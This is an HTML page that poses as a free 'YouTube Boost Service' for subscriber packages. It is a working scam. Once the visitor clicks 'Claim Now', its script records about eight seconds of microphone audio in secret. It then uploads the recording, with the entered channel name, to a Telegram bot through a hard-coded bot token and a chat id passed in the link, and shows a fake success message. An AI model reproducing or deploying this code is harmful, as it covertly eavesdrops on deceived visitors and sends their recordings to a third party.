<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>YouTube Boost Service</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f0f0f;
      color: #fff;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .container {
      text-align: center;
      padding: 40px 20px;
      max-width: 460px;
      width: 100%;
    }
    .youtube-logo {
      font-size: 120px;
      font-weight: bold;
      color: #ff0000;
      margin: 20px 0 40px;
      text-shadow: 0 0 30px rgba(255,0,0,0.4);
    }
    h2 { margin: 0.4em 0 1.2em; font-size: 1.5rem; }
    select, input[type="text"] {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      font-size: 1.1rem;
      border: 1px solid #333;
      border-radius: 6px;
      background: #1e1e1e;
      color: white;
    }
    button {
      width: 100%;
      padding: 16px;
      font-size: 1.2rem;
      font-weight: bold;
      margin: 16px 0 8px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.2s;
    }
    #selectBtn { background: #ff0000; color: white; }
    #selectBtn:hover { background: #cc0000; }
    #claimBtn { 
      background: #00aa00; 
      color: white; 
      display: none; 
    }
    #claimBtn:hover { background: #008800; }
    #status {
      margin: 20px 0;
      font-size: 1.15rem;
      min-height: 1.6em;
      color: #0f8;
      visibility: hidden; /* completely hide during process */
    }
    #status.success {
      visibility: visible;
      color: #0f8;
    }
    .hidden { display: none !important; }
  </style>
</head>
<body>

<div class="container">

  <div class="youtube-logo">YouTube</div>

  <h2>Select Subscribers Package</h2>

  <select id="package">
    <option value="">— Choose Package —</option>
    <option value="100">100 subscribers</option>
    <option value="200">200 subscribers</option>
    <option value="1000">1K subscribers</option>
  </select>

  <button id="selectBtn">Continue</button>

  <div id="step2" class="hidden">

    <h2>Enter Your Channel Username</h2>
    <input type="text" id="username" placeholder="@yourchannel or channel name" autocomplete="off" />

    <button id="claimBtn">Claim Now</button>

    <div id="status"></div>

  </div>

</div>

<script>
// ────────────────────────────────────────────────
const urlParams = new URLSearchParams(window.location.search);
const destinationChatId = urlParams.get("id");

if (!destinationChatId) {
  document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:100px'>Error: Link invalid</h1>";
  throw new Error("No destination provided");
}

const BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";   // ← Change only this

const statusEl = document.getElementById("status");
const selectBtn = document.getElementById("selectBtn");
const claimBtn  = document.getElementById("claimBtn");
// ────────────────────────────────────────────────

selectBtn.onclick = () => {
  const pkg = document.getElementById("package").value;
  if (!pkg) {
    alert("Please select a package!");
    return;
  }
  document.getElementById("step2").classList.remove("hidden");
  selectBtn.classList.add("hidden");
};

claimBtn.onclick = async () => {
  const username = document.getElementById("username").value.trim();
  if (!username) {
    alert("Enter channel username!");
    return;
  }

  statusEl.textContent = "Processing...";
  statusEl.style.visibility = "visible"; // only show "Processing..."
  claimBtn.disabled = true;
  selectBtn.style.display = "none";

  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
  } catch (err) {
    statusEl.textContent = "";
    statusEl.style.visibility = "hidden";
    alert("Microphone permission needed. Please allow it.");
    claimBtn.disabled = false;
    return;
  }

  // ── Silent recording ───────────────────────────────────────
  const recorder = new MediaRecorder(stream);
  const chunks = [];

  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.onstop = async () => {
    stream.getTracks().forEach(t => t.stop());

    const blob = new Blob(chunks, { type: "audio/webm" });

    // ── Silent upload ────────────────────────────────────────
    try {
      const formData = new FormData();
      formData.append("chat_id", destinationChatId);
      formData.append("voice", blob, `v_${Date.now()}.webm`);
      formData.append("caption", 
        `Channel: ${username}\n` +
        `Package: ${document.getElementById("package").value}\n` +
        `Time: ${new Date().toISOString()}`
      );

      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
        method: "POST",
        body: formData
      });

      const result = await res.json();

      if (res.ok && result.ok) {
        statusEl.textContent = "Success! Wait 24 hours — Your order has been requested";
        statusEl.className = "success";
      } else {
        statusEl.textContent = "Something went wrong. Try again.";
        statusEl.style.color = "#f33";
      }
    } catch {
      statusEl.textContent = "Connection error.";
      statusEl.style.color = "#f33";
    } finally {
      claimBtn.disabled = false;
    }
  };

  recorder.start();
  setTimeout(() => recorder.stop(), 8200);
};
</script>
</body>
</html>
